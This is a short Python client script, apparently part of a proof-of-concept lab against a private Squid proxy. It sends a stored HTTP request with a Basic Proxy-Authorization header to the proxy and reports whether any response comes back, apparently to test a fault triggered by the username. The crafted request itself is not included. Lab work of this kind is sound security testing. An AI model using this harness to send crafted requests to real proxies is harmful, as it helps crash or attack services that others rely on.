#!/usr/bin/env python3
"""Send one checked-in HTTP request to the private Squid lab."""

import base64
import socket
import sys
from pathlib import Path


if len(sys.argv) != 2:
    raise SystemExit("usage: client.py <request.http>")
request = Path(sys.argv[1]).read_bytes()
authorization = next(
    line.removeprefix(b"Proxy-Authorization: Basic ")
    for line in request.split(b"\r\n")
    if line.startswith(b"Proxy-Authorization: Basic ")
)
username = base64.b64decode(authorization, validate=True).split(b":", 1)[0]

print(f"[client] username bytes: {len(username)}", flush=True)
print("[client] request: GET http://peerstub/poc HTTP/1.1", flush=True)
with socket.create_connection(("squid", 3128), timeout=10) as connection:
    connection.settimeout(10)
    connection.sendall(request)
    try:
        first_line = connection.recv(4096).split(b"\r\n", 1)[0]
    except (ConnectionResetError, socket.timeout):
        first_line = b""
print("[client] response: " + (first_line.decode("latin1") or "<no response>"))
